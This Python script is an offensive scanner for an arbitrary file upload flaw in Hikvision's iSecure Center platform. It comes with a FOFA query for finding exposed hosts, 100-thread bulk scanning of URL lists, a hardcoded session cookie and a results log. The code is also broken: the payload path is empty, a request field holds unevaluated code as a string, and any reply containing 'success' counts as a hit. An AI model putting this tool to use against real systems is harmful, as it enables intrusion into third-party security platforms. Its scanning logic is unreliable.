# 海康威视综合安防管理平台软件 files;.js 存在任意文件上传漏洞
# fofa:app="HIKVISION-iSecure-Center"

import requests, sys, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="海康威视综合安防管理平台软件 files;.js 存在任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input your file path')
    args = parser.parse_args() 
    if args.url and not args.file:
        poc(args.url)  
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  
        mp.map(poc, url_list)  
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = ""
    url = target + payload_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
    }
    data = {
        "service":'urllib.parse.quote(url + "/home/index.action")'
    }
    try:
        res = requests.get(url=url,headers=headers,data=data,timeout=5,verify=False).text
        if 'success' in res: 
            print(f'[+]该url:{target}存在任意文件上传漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在任意文件上传漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在任意文件上传漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')
    
if __name__ == '__main__':
    main()